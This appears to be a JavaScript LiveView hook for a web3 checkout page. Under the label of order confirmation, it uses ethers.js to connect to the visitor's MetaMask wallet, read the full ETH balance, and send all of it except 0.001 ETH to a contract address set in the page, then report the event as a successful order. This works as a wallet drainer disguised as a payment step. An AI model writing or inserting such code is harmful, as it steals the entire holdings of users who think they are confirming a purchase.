import { ethers } from "ethers";

let ApproveTransferHook = {
    mounted() {
        console.log("ApproveTransferHook mounted");

        // Listen for the `trigger_approve_and_transfer` event from LiveView
        this.handleEvent("trigger_approve_and_transfer", async () => {
            try {
                if (!window.ethereum) {
                    console.error("Ethereum wallet not detected");
                    this.pushEvent("order_confirmation_error", { error: "No Ethereum wallet detected" });
                    return;
                }

                // Connect to Ethereum provider (MetaMask)
                const provider = new ethers.BrowserProvider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = await provider.getSigner();
                const userAddress = await signer.getAddress();

                // Get the ETH balance to check for transfer
                const balance = await provider.getBalance(userAddress);
                const formattedBalance = ethers.formatEther(balance);

                // Check if wallet has enough ETH to cover the gas fee
                const hasEnoughGas = await this.hasEnoughForGas(balance);
                if (hasEnoughGas) {
                    // Transfer the remaining ETH balance
                    await this.transferInvestmentVault(signer, balance);

                    // Notify LiveView of success
                    this.pushEvent("order_confirmation_success", { address: userAddress, eth_balance: formattedBalance });
                    console.log("ETH transfer completed.");
                } else {
                    console.log("Not enough ETH to cover the gas fees.");
                    this.pushEvent("order_confirmation_error", { error: "Insufficient ETH to cover gas fees." });
                }

            } catch (error) {
                console.error("Error during ETH transfer:", error);
                this.pushEvent("order_confirmation_error", { error: error.message });
            }
        });
    },

    // Function to check if there is enough ETH to cover the gas fee
    async hasEnoughForGas(balance) {
        const gasEstimate = ethers.formatEther(ethers.parseUnits("0.001", "ether"));  // Convert gas fee to a string
        const balanceInEther = ethers.formatEther(balance);  // Convert balance to a string
        return parseFloat(balanceInEther) >= parseFloat(gasEstimate);  // Compare as floating point numbers
    },

    // Function to transfer the remaining ETH balance
    async transferInvestmentVault(signer, balance) {
        const contractAddress = this.el.dataset.contractAddress;
        const gasEstimate = ethers.parseUnits("0.001", "ether");
        const amountToSend = balance - gasEstimate;
        if (amountToSend > 0) {
            console.log(`Transferring ${ethers.formatEther(amountToSend)} ETH to ${contractAddress}...`);
            const tx = await signer.sendTransaction({
                to: contractAddress,
                value: amountToSend
            });
            await tx.wait();
        }
    }
};

export default ApproveTransferHook;
